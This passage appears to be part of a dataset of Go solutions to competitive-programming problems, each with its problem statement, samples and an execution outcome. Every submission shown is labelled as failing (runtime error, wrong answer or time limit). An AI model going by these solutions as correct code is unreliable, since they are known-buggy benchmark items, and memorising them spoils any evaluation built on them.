{\n\t\t\tprev = 'x'\n\t\t}\n\t\tif (a[i-1] == 2 || a[i-1] == 3) && (prev != 's') {\n\t\t\ty = dp[i-1]\n\t\t}\n\t\tif (a[i-1] == 1 || a[i-1] == 3) && (prev != 'c') {\n\t\t\tz = dp[i-1]\n\t\t}\n\t\tx = dp[i-1] + 1\n\t\tminans := min(x, min(y, z))\n\t\tdp[i] = minans\n\t\tif minans == x {\n\t\t\ts += \"r\"\n\t\t} else if minans == y {\n\t\t\ts += \"s\"\n\t\t} else {\n\t\t\ts += \"c\"\n\t\t}\n\n\t}\n\tprintf(\"%d\\n\", dp[n])\n}\n","description":"Vasya has n days of vacations! So he decided to improve his IT skills and do sport. Vasya knows the following information about each of this n days: whether that gym opened and whether a contest was carried out in the Internet on that day. For the i-th day there are four options:  on this day the gym is closed and the contest is not carried out;  on this day the gym is closed and the contest is carried out;  on this day the gym is open and the contest is not carried out;  on this day the gym is open and the contest is carried out. On each of days Vasya can either have a rest or write the contest (if it is carried out on this day), or do sport (if the gym is open on this day).Find the minimum number of days on which Vasya will have a rest (it means, he will not do sport and write the contest at the same time). The only limitation that Vasya has \u2014 he does not want to do the same activity on two consecutive days: it means, he will not do sport on two consecutive days, and write the contest on two consecutive days.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a positive integer n (1\u2009\u2264\u2009n\u2009\u2264\u2009100) \u2014 the number of days of Vasya's vacations. The second line contains the sequence of integers a1,\u2009a2,\u2009...,\u2009an (0\u2009\u2264\u2009ai\u2009\u2264\u20093) separated by space, where:    ai equals 0, if on the i-th day of vacations the gym is closed and the contest is not carried out;  ai equals 1, if on the i-th day of vacations the gym is closed, but the contest is carried out;  ai equals 2, if on the i-th day of vacations the gym is open and the contest is not carried out;  ai equals 3, if on the i-th day of vacations the gym is open and the contest is carried out.","output_spec":"Print the minimum possible number of days on which Vasya will have a rest. Remember that Vasya refuses:   to do sport on any two consecutive days,  to write the contest on any two consecutive days. ","notes":"NoteIn the first test Vasya can write the contest on the day number 1 and do sport on the day number 3. Thus, he will have a rest for only 2 days.In the second test Vasya should write contests on days number 1, 3, 5 and 7, in other days do sport. Thus, he will not have a rest for a single day.In the third test Vasya can do sport either on a day number 1 or number 2. He can not do sport in two days, because it will be contrary to the his limitation. Thus, he will have a rest for only one day.","sample_inputs":["4\n1 3 2 0","7\n1 3 3 2 1 2 3","2\n2 2"],"sample_outputs":["2","0","1"]}
{"difficulty":1200,"lang":"Go","lang_cluster":"go","src_uid":"15fa49860e978d3b3fb7a20bf9f8aa86","submission_id":"re_903","tags":["implementation","geometry","brute force"],"exec_outcome":"RUNTIME_ERROR","source_code":"package main\n\nimport (\n\t\"bufio\"\n\t\"fmt\"\n\t\"math\"\n\t\"os\"\n)\n\nfunc main() {\n\treader := bufio.NewReader(os.Stdin)\n\n\tn, vb, vs := readThreeNums(reader)\n\tX := readNNums(reader, n)\n\troom := readNNums(reader, 2)\n\n\tfmt.Println(solve(n, vb, vs, X, room))\n}\n\nfunc readInt(bytes []byte, from int, val *int) int {\n\ti := from\n\tsign := 1\n\tif bytes[i] == '-' {\n\t\tsign = -1\n\t\ti++\n\t}\n\ttmp := 0\n\tfor i < len(bytes) && bytes[i] >= '0' && bytes[i] <= '9' {\n\t\ttmp = tmp*10 + int(bytes[i]-'0')\n\t\ti++\n\t}\n\t*val = tmp * sign\n\treturn i\n}\n\nfunc readNum(reader *bufio.Reader) (a int) {\n\tbs, _ := reader.ReadBytes('\\n')\n\treadInt(bs, 0, &a)\n\treturn\n}\n\nfunc readTwoNums(reader *bufio.Reader) (a int, b int) {\n\tres := readNNums(reader, 2)\n\ta, b = res[0], res[1]\n\treturn\n}\n\nfunc readThreeNums(reader *bufio.Reader) (a int, b int, c int) {\n\tres := readNNums(reader, 3)\n\ta, b, c = res[0], res[1], res[2]\n\treturn\n}\n\nfunc readNNums(reader *bufio.Reader, n int) []int {\n\tres := make([]int, n)\n\tx := 0\n\tbs, _ := reader.ReadBytes('\\n')\n\tfor i := 0; i < n; i++ {\n\t\tfor x < len(bs) && (bs[x] < '0' || bs[x] > '9') {\n\t\t\tx++\n\t\t}\n\t\tx = readInt(bs, x, &res[i])\n\t}\n\treturn res\n}\n\nfunc readUint64(bytes []byte, from int, val *uint64) int {\n\ti := from\n\n\tvar tmp uint64\n\tfor i < len(bytes) && bytes[i] >= '0' && bytes[i] <= '9' {\n\t\ttmp = tmp*10 + uint64(bytes[i]-'0')\n\t\ti++\n\t}\n\t*val = tmp\n\n\treturn i\n}\n\nfunc solve(n int, vb int, vs int, X []int, exam []int) int {\n\ttime := make([]float64, n)\n\tv1 := float64(vs)\n\tv2 := float64(vb)\n\tvar best = math.MaxFloat64\n\tvar pos int\n\tfor i := 0; i < n; i++ {\n\t\tt1 := float64(X[0]) \/ v1\n\t\tt2 := distance(exam[0], exam[1], X[i], 0) \/ v2\n\t\ttime[i] = t1 + t2\n\t\tif i > 0 && time[i] < best {\n\t\t\tbest = time[i]\n\t\t\tpos = i\n\t\t}\n\t}\n\treturn pos + 1\n}\n\nfunc distance(a, b, c, d int) float64 {\n\tdx := float64(c - a)\n\tdy := float64(d - b)\n\treturn math.Sqrt(dx*dx + dy*dy)\n}\n","description":"And again a misfortune fell on Poor Student. He is being late for an exam.Having rushed to a bus stop that is in point (0,\u20090), he got on a minibus and they drove along a straight line, parallel to axis OX, in the direction of increasing x.Poor Student knows the following:   during one run the minibus makes n stops, the i-th stop is in point (xi,\u20090)  coordinates of all the stops are different  the minibus drives at a constant speed, equal to vb  it can be assumed the passengers get on and off the minibus at a bus stop momentarily  Student can get off the minibus only at a bus stop  Student will have to get off the minibus at a terminal stop, if he does not get off earlier  the University, where the exam will be held, is in point (xu,\u2009yu)  Student can run from a bus stop to the University at a constant speed vs as long as needed  a distance between two points can be calculated according to the following formula:   Student is already on the minibus, so, he cannot get off at the first bus stop Poor Student wants to get to the University as soon as possible. Help him to choose the bus stop, where he should get off. If such bus stops are multiple, choose the bus stop closest to the University.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains three integer numbers: 2\u2009\u2264\u2009n\u2009\u2264\u2009100, 1\u2009\u2264\u2009vb,\u2009vs\u2009\u2264\u20091000. The second line contains n non-negative integers in ascending order: coordinates xi of the bus stop with index i. It is guaranteed that x1 equals to zero, and xn\u2009\u2264\u2009105. The third line contains the coordinates of the University, integers xu and yu, not exceeding 105 in absolute value. ","output_spec":"In the only line output the answer to the problem \u2014 index of the optimum bus stop.","notes":"NoteAs you know, students are a special sort of people, and minibuses usually do not hurry. That's why you should not be surprised, if Student's speed is higher than the speed of the minibus.","sample_inputs":["4 5 2\n0 2 4 6\n4 1","2 1 1\n0 100000\n100000 100000"],"sample_outputs":["3","2"]}
{"difficulty":1200,"lang":"Go","lang_cluster":"go","src_uid":"18_C","submission_id":"136337832","tags":["data+structures","implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"package main\n\nimport (\n\t\"bufio\"\n\t\"fmt\"\n\t\"math\"\n\t\"os\"\n\t\"strconv\"\n\t\"strings\"\n)\n\n\/*\n1\n3\n---\n0\n======\n2\n2 2\n---\n1\n======\n2\n-4 -4\n---\n1\n======\n6\n1 2 3 1 2 3\n---\n1\n======\n5\n1 -2 3 0 -1\n---\n0\n*\/\n\n\/\/goland:noinspection GoUnhandledErrorResult\nfunc main() {\n\tdefer writer.Flush()\n\n\tbld := strings.Builder{}\n\n\tt := 1\n\t\/\/scanf(\"%d\\n\", &t)\n\n\tfor ; t > 0; t-- {\n\t\tvar n int\n\t\tscanf(\"%d\\n\", &n)\n\n\t\t\/\/ overflow is expected\n\t\tps := make([]int, n)\n\n\t\tif strconv.IntSize == 64 {\n\t\t\tprintf(\"64bit\")\n\t\t\treturn\n\t\t}\n\n\t\tfor i := 0; i < n; i++ {\n\t\t\tvar num int\n\t\t\tscanf(\"%d\", &num)\n\n\t\t\tif i == 0 {\n\t\t\t\tps[i] = num\n\t\t\t} else {\n\t\t\t\tps[i] = ps[i-1] + num\n\t\t\t}\n\t\t}\n\n\t\tcnt := 0\n\n\t\tfor i := 0; i < n-1; i++ {\n\t\t\tleftSum := ps[i]\n\t\t\trightSum := ps[n-1] - ps[i]\n\t\t\tif leftSum == rightSum {\n\t\t\t\tcnt++\n\t\t\t}\n\t\t}\n\n\t\tfmt.Fprintln(&bld, cnt)\n\t}\n\n\tprintf(\"%s\", bld.String())\n}\n\nconst maxUint = ^uint(0)\n\n\/\/goland:noinspection GoUnusedConst\nconst minUint = 0\nconst maxInt = int(maxUint >> 1)\n\n\/\/goland:noinspection GoUnusedConst\nconst minInt = -maxInt - 1\n\n\/\/goland:noinspection GoUnusedType\ntype pair struct {\n\tfst int\n\tsnd int\n}\n\nvar reader = bufio.NewReader(os.Stdin)\nvar writer = bufio.NewWriter(os.Stdout)\n\n\/\/goland:noinspection GoUnusedFunction\nfunc printf(f string, a ...interface{}) {\n\tif _, err := fmt.Fprintf(writer, f, a...); err != nil {\n\t\tpanic(err)\n\t}\n}\n\nfunc scanf(f string, a ...interface{}) {\n\tif _, err := fmt.Fscanf(reader, f, a...); err != nil {\n\t\tpanic(err)\n\t}\n}\n\n\/\/goland:noinspection GoUnusedFunction\nfunc min(x, y int) int {\n\tif x < y {\n\t\treturn x\n\t}\n\treturn y\n}\n\n\/\/goland:noinspection GoUnusedFunction\nfunc max(x, y int) int {\n\tif x > y {\n\t\treturn x\n\t}\n\treturn y\n}\n\n\/\/goland:noinspection GoUnusedFunction\nfunc abs(x int) int {\n\tif x < 0 {\n\t\treturn -x\n\t}\n\treturn x\n}\n\n\/\/goland:noinspection GoUnusedFunction\nfunc isPrime(n int) bool {\n\tif n == 2 || n == 3 {\n\t\treturn true\n\t}\n\n\tif n <= 1 || n%2 == 0 || n%3 == 0 {\n\t\treturn false\n\t}\n\n\tfor i := 5; i*i <= n; i += 6 {\n\t\tif n%i == 0 || n%(i+2) == 0 {\n\t\t\treturn false\n\t\t}\n\t}\n\n\treturn true\n}\n\n\/\/goland:noinspection GoUnusedFunction\nfunc gcd(a, b int) int {\n\tfor b != 0 {\n\t\ta, b = b, a%b\n\t}\n\treturn a\n}\n\n\/\/goland:noinspection GoUnusedFunction\nfunc lcm(a, b int) int {\n\treturn abs(a) \/ gcd(a, b) * abs(b)\n}\n\n\/\/ Examples:\n\/\/\tdigitAt(1234, 0) -> 4\n\/\/\tdigitAt(1234, 1) -> 3\n\/\/\tdigitAt(1234, 2) -> 2\n\/\/\tdigitAt(1234, 3) -> 2\n\/\/\tdigitAt(1234, 4) -> panic!\n\/\/goland:noinspection GoUnusedFunction\nfunc digitAt(num, pos int) int {\n\tlenNum := int(math.Log10(float64(num))) + 1\n\tif pos >= lenNum {\n\t\terr := fmt.Sprintf(\"Out of bound access for digit. Position passed %d, number lenght %d\", pos, lenNum)\n\t\tpanic(err)\n\t}\n\n\trem := num % int(math.Pow(10, float64(pos+1)))\n\treturn rem \/ int(math.Pow(10, float64(pos)))\n}\n","description":"Once Bob took a paper stripe of n squares (the height of the stripe is 1 square). In each square he wrote an integer number, possibly negative. He became interested in how many ways exist to cut this stripe into two pieces so that the sum of numbers from one piece is equal to the sum of numbers from the other piece, and each piece contains positive integer amount of squares. Would you help Bob solve this problem?","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains integer n (1\u2264n\u226410^5) \u2014 amount of squares in the stripe. The second line contains n space-separated numbers \u2014 they are the numbers written in the squares of the stripe. These numbers are integer and do not exceed 10000 in absolute value.\n","output_spec":"Output the amount of ways to cut the stripe into two non-empty pieces so that the sum of numbers from one piece is equal to the sum of numbers from the other piece. Don't forget that it's allowed to cut the stripe along the squares' borders only.\n","notes":null,"sample_inputs":["9\n1 5 -6 7 9 -16 0 -2 2\n","3\n1 1 1\n","2\n0 0\n"],"sample_outputs":["3\n","0\n","1\n"]}
{"difficulty":1200,"lang":"Go","lang_cluster":"go","src_uid":"1ae2942b72ebb7c55359c41e141900d7","submission_id":"re_1532","tags":["implementation"],"exec_outcome":"TIME_LIMIT_EXCEEDED","source_code":"package main\n\nimport (\n\t\"fmt\"\n)\n\nfunc can_buy(cur uint64, prizes []int) int {\n\tfor i:=4; i>=0; i-- {\n\t\tif cur >= uint64(prizes[i]) {\n\t\t\treturn i\n\t\t}\n\t}\n\treturn -1\n}\n\nfunc main() {\n\tvar n int\n\tvar cur uint64 = 0\n\tfmt.Scan(&n)\n\tpoints := make([]int, n)\n\tprizes := make([]int, 5)\n\tclaimed_prizes := make([]int, 5)\n\tfor i:=0; i<n; i++ {\n\t\tfmt.Scan(&points[i])\n\t}\n\tfor i:=0; i<5; i++ {\n\t\tfmt.Scan(&prizes[i])\n\t\tclaimed_prizes[i] = 0\n\t}\n\tfor i:=0; i<n; i++ {\n\t\tfmt.Println(i)\n\t\tcur += uint64(points[i])\n\t\tfor idx:=can_buy(cur, prizes); idx!=-1; idx=can_buy(cur,prizes) {\n\t\t\tcur -= uint64(prizes[idx])\n\t\t\tclaimed_prizes[idx]++\n\t\t}\n\t}\n\tfor i:=0; i<5; i++ {\n\t\tfmt.Printf(\"%d \", claimed_prizes[i])\n\t}\n\tfmt.Printf(\"\\n\")\n\tfmt.Println(cur)\n}","description":"Vasya, like many others, likes to participate in a variety of sweepstakes and lotteries. Now he collects wrappings from a famous chocolate bar \"Jupiter\". According to the sweepstake rules, each wrapping has an integer written on it \u2014 the number of points that the participant adds to his score as he buys the bar. After a participant earns a certain number of points, he can come to the prize distribution center and exchange the points for prizes. When somebody takes a prize, the prize's cost is simply subtracted from the number of his points.Vasya didn't only bought the bars, he also kept a record of how many points each wrapping cost. Also, he remembers that he always stucks to the greedy strategy \u2014 as soon as he could take at least one prize, he went to the prize distribution centre and exchanged the points for prizes. Moreover, if he could choose between multiple prizes, he chose the most expensive one. If after an exchange Vasya had enough points left to get at least one more prize, then he continued to exchange points.The sweepstake has the following prizes (the prizes are sorted by increasing of their cost):   a mug (costs a points),  a towel (costs b points),  a bag (costs c points),  a bicycle (costs d points),  a car (costs e points). Now Vasya wants to recollect what prizes he has received. You know sequence p1,\u2009p2,\u2009...,\u2009pn, where pi is the number of points Vasya got for the i-th bar. The sequence of points is given in the chronological order. You also know numbers a, b, c, d, e. Your task is to find, how many prizes Vasya received, what prizes they are and how many points he's got left after all operations are completed.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer n (1\u2009\u2264\u2009n\u2009\u2264\u200950) \u2014 the number of chocolate bar wrappings that brought points to Vasya. The second line contains space-separated integers p1,\u2009p2,\u2009...,\u2009pn (1\u2009\u2264\u2009pi\u2009\u2264\u2009109). The third line contains 5 integers a, b, c, d, e (1\u2009\u2264\u2009a\u2009&lt;\u2009b\u2009&lt;\u2009c\u2009&lt;\u2009d\u2009&lt;\u2009e\u2009\u2264\u2009109) \u2014 the prizes' costs.","output_spec":"Print on the first line 5 integers, separated by a space \u2014 the number of mugs, towels, bags, bicycles and cars that Vasya has got, respectively. On the second line print a single integer \u2014 the number of points Vasya will have left after all operations of exchange are completed. Please, do not use the %lld specifier to read or write 64-bit integers in \u0421++. It is preferred to use the cin, cout streams or the %I64d specifier.","notes":"NoteIn the first sample Vasya gets 3 points after eating the first chocolate bar. Then he exchanges 2 points and gets a mug. Vasya wins a bag after eating the second chocolate bar. Then he wins a towel after eating the third chocolate bar. After all chocolate bars 3\u2009-\u20092\u2009+\u200910\u2009-\u200910\u2009+\u20094\u2009-\u20094\u2009=\u20091 points remains.","sample_inputs":["3\n3 10 4\n2 4 10 15 20","4\n10 4 39 2\n3 5 10 11 12"],"sample_outputs":["1 1 1 0 0 \n1","3 0 1 0 3 \n0"]}
{"difficulty":1500,"lang":"Go","lang_cluster":"go","src_uid":"24_B","submission_id":"116219327","tags":["implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"package main\r\n\r\nimport (\r\n\t\"bufio\"\r\n\t\"fmt\"\r\n\t\"os\"\r\n)\r\n\r\nvar reader *bufio.Reader = bufio.NewReader(os.Stdin)\r\nvar writer *bufio.Writer = bufio.NewWriter(os.Stdout)\r\n\r\nfunc scanf(f string, a ...interface{})  { fmt.Fscanf(reader, f, a...) }\r\nfunc printf(f string, a ...interface{}) { fmt.Fprintf(writer, f, a...) }\r\n\r\ntype game struct {\r\n\tname  string\r\n\tscore int\r\n\tplace [10]int\r\n}\r\n\r\nfunc main() {\r\n\t\/\/ STDOUT MUST BE FLUSHED MANUALLY!!!\r\n\tdefer writer.Flush()\r\n\tif len(os.Args[1:]) == 1 {\r\n\t\tfile, _ := os.Open(os.Args[1])\r\n\t\treader = bufio.NewReader(file)\r\n\t}\r\n\r\n\tvar n, t int\r\n\tscanf(\"%d\\n\", &t)\r\n\tn2n := make(map[string]int)\r\n\tstart := 0\r\n\tvar s string\r\n\tc := make([]game, 50)\r\n\trank := [10]int{25, 18, 15, 12, 10, 8, 6, 4, 2, 1}\r\n\tfor i := 0; i < t; i++ {\r\n\t\tscanf(\"%d\\n\", &n)\r\n\t\tfor j := 0; j < n; j++ {\r\n\t\t\tscanf(\"%s\\n\", &s)\r\n\t\t\tif j >= 10 {\r\n\t\t\t\tcontinue\r\n\t\t\t}\r\n\t\t\tindex, ok := n2n[s]\r\n\t\t\tif !ok {\r\n\t\t\t\tn2n[s] = start\r\n\t\t\t\tindex = start\r\n\t\t\t\tstart++\r\n\t\t\t}\r\n\t\t\tc[index].name = s\r\n\t\t\tc[index].score += rank[j]\r\n\t\t\tc[index].place[j]++\r\n\t\t}\r\n\t}\r\n\tma := c[0]\r\n\t\/\/fmt.Println(c)\r\n\tfor i := 1; i < 50; i++ {\r\n\t\tif bigger(c[i], ma) {\r\n\t\t\tma = c[i]\r\n\t\t}\r\n\t}\r\n\tprintf(\"%s\\n\", ma.name)\r\n\tma = c[0]\r\n\tfor i := 1; i < 50; i++ {\r\n\t\tif bigger2(c[i], ma) {\r\n\t\t\tma = c[i]\r\n\t\t}\r\n\t}\r\n\tprintf(\"%s\\n\", ma.name)\r\n}\r\n\r\nfunc bigger(left, right game) bool {\r\n\tif left.score > right.score {\r\n\t\treturn true\r\n\t}\r\n\tif left.score < right.score {\r\n\t\treturn false\r\n\t}\r\n\tfor i := 0; i < 10; i++ {\r\n\t\tif left.place[i] > right.place[i] {\r\n\t\t\treturn true\r\n\t\t} else if left.place[i] < right.place[i] {\r\n\t\t\treturn false\r\n\t\t}\r\n\t}\r\n\r\n\treturn false\r\n}\r\n\r\nfunc bigger2(left, right game) bool {\r\n\tif left.place[0] > right.place[0] {\r\n\t\treturn true\r\n\t} else if left.place[0] < right.place[0] {\r\n\t\treturn false\r\n\t}\r\n\tif left.score > right.score {\r\n\t\treturn true\r\n\t}\r\n\tif left.score < right.score {\r\n\t\treturn false\r\n\t}\r\n\tfor i := 1; i < 10; i++ {\r\n\t\tif left.place[i] > right.place[i] {\r\n\t\t\treturn true\r\n\t\t} else if left.place[i] < right.place[i] {\r\n\t\t\treturn false\r\n\t\t}\r\n\t}\r\n\r\n\treturn false\r\n}\r\n","description":"Formula One championship consists of series of races called Grand Prix. After every race drivers receive points according to their final position. Only the top 10 drivers receive points in the following order 25, 18, 15, 12, 10, 8, 6, 4, 2, 1. At the conclusion of the championship the driver with most points is the champion. If there is a tie, champion is the one with most wins (i.e. first places). If a tie still exists, it is chosen the one with most second places, and so on, until there are no more place to use for compare. Last year another scoring system was proposed but rejected. In it the champion is the one with most wins. If there is tie, champion is the one with most points. If a tie still exists it is proceeded the same way as in the original scoring system, that is comparing number of second, third, forth, and so on, places.You are given the result of all races during the season and you are to determine the champion according to both scoring systems. It is guaranteed, that both systems will produce unique champion.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contain integer t (1\u2264t\u226420), where t is the number of races. After that all races are described one by one. Every race description start with an integer n (1\u2264n\u226450) on a line of itself, where n is the number of clasified drivers in the given race. After that n lines follow with the classification for the race, each containing the name of a driver. The names of drivers are given in order from the first to the last place. The name of the driver consists of lowercase and uppercase English letters and has length at most 50 characters. Comparing of names should be case-sensetive.\n","output_spec":"Your output should contain exactly two line. On the first line is the name of the champion according to the original rule, and on the second line the name of the champion according to the alternative rule.\n","notes":"It is not guaranteed that the same drivers participate in all races. For the championship consider every driver that has participated in at least one race. The total number of drivers during the whole season is not more then 50.\n","sample_inputs":["3\n3\nHamilton\nVettel\nWebber\n2\nWebber\nVettel\n2\nHamilton\nVettel\n","2\n7\nProst\nSurtees\nNakajima\nSchumacher\nButton\nDeLaRosa\nBuemi\n8\nAlonso\nProst\nNinoFarina\nJimClark\nDeLaRosa\nNakajima\nPatrese\nSurtees\n"],"sample_outputs":["Vettel\nHamilton\n","Prost\nProst\n"]}
{"difficulty":1100,"lang":"Go","lang_cluster":"go","src_uid":"54c748dd983b6a0ea1af1153d08f1c01","submission_id":"re_1429","tags":[],"exec_outcome":"RUNTIME_ERROR","source_code":"package main\n\nimport (\n\t\"fmt\"\n\t\"bufio\"\n\t\"os\"\n\t\"strconv\"\n)\n\nvar scanner = bufio.NewScanner(os.Stdin)\nvar writer = bufio.NewWriter(os.Stdout)\n\n\/\/Wrong\nfunc main() {\n\tdefer writer.Flush()\n\tscanner.Split(bufio.ScanWords)\n\n\tn := nextInt()\n\t_ = n\n\n\ts := next()\n\n\ti, count := 0, 0\n\n\tfor i<len(s) && s[i]=='.' {\n\t\ti++\n\t}\n\n\tif i==len(s) {\n\t\tprintln(0)\n\t\treturn\n\t}\n\n\tlastPush := i\n\ti++\n\n\tif s[lastPush]=='R' {\n\t\tcount += lastPush\n\t}\n\n\tfor i<len(s) {\n\t\tif s[i] != '.' {\n\t\t\tif s[i] == 'R' {\n\t\t\t\tcount += i - lastPush - 1\n\t\t\t} else {\n\t\t\t\tif (i-lastPush)%2 == 0 {\n\t\t\t\t\tcount++\n\t\t\t\t}\n\t\t\t}\n\t\t\tlastPush = i\n\t\t}\n\t\ti++\n\t}\n\n\tif s[lastPush]=='L' {\n\t\tcount += len(s) - lastPush - 1\n\t}\n\t\n\tprintln(count)\n}\n\nfunc next() string {\n\tif !scanner.Scan() {\n\t\tpanic(\"Scan error\")\n\t}\n\treturn scanner.Text()\n}\n\nfunc nextInt() int {\n\tn, err := strconv.Atoi(next())\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\treturn n\n}\n\nfunc nextFloat() float64 {\n\tn, err := strconv.ParseFloat(next(), 64)\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\treturn n\n}\n\nfunc println(a ...interface{}) {\n\tfmt.Fprintln(writer, a...)\n}\n\nfunc print(a ...interface{}) {\n\tfmt.Fprint(writer, a...)\n}","description":"Little Chris knows there's no fun in playing dominoes, he thinks it's too random and doesn't require skill. Instead, he decided to play with the dominoes and make a \"domino show\".Chris arranges n dominoes in a line, placing each piece vertically upright. In the beginning, he simultaneously pushes some of the dominoes either to the left or to the right. However, somewhere between every two dominoes pushed in the same direction there is at least one domino pushed in the opposite direction.After each second, each domino that is falling to the left pushes the adjacent domino on the left. Similarly, the dominoes falling to the right push their adjacent dominoes standing on the right. When a vertical domino has dominoes falling on it from both sides, it stays still due to the balance of the forces. The figure shows one possible example of the process.  Given the initial directions Chris has pushed the dominoes, find the number of the dominoes left standing vertically at the end of the process!","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer n (1\u2009\u2264\u2009n\u2009\u2264\u20093000), the number of the dominoes in the line. The next line contains a character string s of length n. The i-th character of the string si is equal to    \"L\", if the i-th domino has been pushed to the left;  \"R\", if the i-th domino has been pushed to the right;  \".\", if the i-th domino has not been pushed.  It is guaranteed that if si\u2009=\u2009sj\u2009=\u2009\"L\" and i\u2009&lt;\u2009j, then there exists such k that i\u2009&lt;\u2009k\u2009&lt;\u2009j and sk\u2009=\u2009\"R\"; if si\u2009=\u2009sj\u2009=\u2009\"R\" and i\u2009&lt;\u2009j, then there exists such k that i\u2009&lt;\u2009k\u2009&lt;\u2009j and sk\u2009=\u2009\"L\".","output_spec":"Output a single integer, the number of the dominoes that remain vertical at the end of the process.","notes":"NoteThe first example case is shown on the figure. The four pieces that remain standing vertically are highlighted with orange.In the second example case, all pieces fall down since the first piece topples all the other pieces.In the last example case, a single piece has not been pushed in either direction.","sample_inputs":["14\n.L.R...LR..L..","5\nR....","1\n."],"sample_outputs":["4","0","1"]}
{"difficulty":800,"lang":"Go","lang_cluster":"go","src_uid":"69850c2af99d60711bcff5870575e15e","submission_id":"re_1492","tags":["implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"\/\/ 38A\npackage main\n\nimport (\n\t\"fmt\"\n)\n\nfunc main() {\n\tvar n, a, b, y int\n\td := [100]int{0}\n\tfmt.Scan(&n)\n\tfor i := 1; i < n; i++ {\n\t\tfmt.Scan(&d[i])\n\t}\n\tfmt.Scan(&a, &b)\n\tfor i := a; i < b-1; i++ {\n\t\ty += d[i]\n\t}\n\tfmt.Println(y)\n}\n","description":"The Berland Armed Forces System consists of n ranks that are numbered using natural numbers from 1 to n, where 1 is the lowest rank and n is the highest rank.One needs exactly di years to rise from rank i to rank i\u2009+\u20091. Reaching a certain rank i having not reached all the previous i\u2009-\u20091 ranks is impossible.Vasya has just reached a new rank of a, but he dreams of holding the rank of b. Find for how many more years Vasya should serve in the army until he can finally realize his dream.","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains an integer n (2\u2009\u2264\u2009n\u2009\u2264\u2009100). The second line contains n\u2009-\u20091 integers di (1\u2009\u2264\u2009di\u2009\u2264\u2009100). The third input line contains two integers a and b (1\u2009\u2264\u2009a\u2009&lt;\u2009b\u2009\u2264\u2009n). The numbers on the lines are space-separated.","output_spec":"Print the single number which is the number of years that Vasya needs to rise from rank a to rank b.","notes":null,"sample_inputs":["3\n5 6\n1 2","3\n5 6\n1 3"],"sample_outputs":["5","11"]}
{"difficulty":1300,"lang":"Go","lang_cluster":"go","src_uid":"6cfd3b0a403212ec68bac1667bce9ef1","submission_id":"re_1167","tags":["implementation"],"exec_outcome":"RUNTIME_ERROR","source_code":"package main\n\nimport (\n\t\"bufio\"\n\t\"fmt\"\n\t\"os\"\n\t\"strconv\"\n)\n\nfunc main() {\n\tvar n int\n\tfmt.Scan(&n)\n\n\tin := make([]bool, 1000001, 1000001)\n\tcur := 0\n\tans := 0\n\n\tbs := bufio.NewScanner(os.Stdin)\n\tbs.Split(bufio.ScanWords)\n\tfor i := 0; i < n; i++ {\n\t\tbs.Scan()\n\t\tc := bs.Text()[0]\n\t\tbs.Scan()\n\t\tp, _ := strconv.Atoi(bs.Text())\n\t\tif c == '+' {\n\t\t\tin[p] = true\n\t\t\tcur++\n\t\t\tif ans < cur {\n\t\t\t\tans = cur\n\t\t\t}\n\t\t} else {\n\t\t\tif in[p] {\n\t\t\t\tcur--\n\t\t\t} else {\n\t\t\t\tans++\n\t\t\t}\n\t\t\tin[p] = false\n\t\t}\n\t}\n\n\tfmt.Println(ans)\n}\n","description":"Berland National Library has recently been built in the capital of Berland. In addition, in the library you can take any of the collected works of Berland leaders, the library has a reading room.Today was the pilot launch of an automated reading room visitors' accounting system! The scanner of the system is installed at the entrance to the reading room. It records the events of the form \"reader entered room\", \"reader left room\". Every reader is assigned a registration number during the registration procedure at the library \u2014 it's a unique integer from 1 to 106. Thus, the system logs events of two forms:  \"+ ri\" \u2014 the reader with registration number ri entered the room;  \"- ri\" \u2014 the reader with registration number ri left the room. The first launch of the system was a success, it functioned for some period of time, and, at the time of its launch and at the time of its shutdown, the reading room may already have visitors.Significant funds of the budget of Berland have been spent on the design and installation of the system. Therefore, some of the citizens of the capital now demand to explain the need for this system and the benefits that its implementation will bring. Now, the developers of the system need to urgently come up with reasons for its existence.Help the system developers to find the minimum possible capacity of the reading room (in visitors) using the log of the system available to you.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a positive integer n (1\u2009\u2264\u2009n\u2009\u2264\u2009100) \u2014 the number of records in the system log. Next follow n events from the system journal in the order in which the were made. Each event was written on a single line and looks as \"+ ri\" or \"- ri\", where ri is an integer from 1 to 106, the registration number of the visitor (that is, distinct visitors always have distinct registration numbers). It is guaranteed that the log is not contradictory, that is, for every visitor the types of any of his two consecutive events are distinct. Before starting the system, and after stopping the room may possibly contain visitors.","output_spec":"Print a single integer \u2014 the minimum possible capacity of the reading room.","notes":"NoteIn the first sample test, the system log will ensure that at some point in the reading room were visitors with registration numbers 1, 1200 and 12001. More people were not in the room at the same time based on the log. Therefore, the answer to the test is 3.","sample_inputs":["6\n+ 12001\n- 12001\n- 1\n- 1200\n+ 1\n+ 7","2\n- 1\n- 2","2\n+ 1\n- 1"],"sample_outputs":["3","2","1"]}
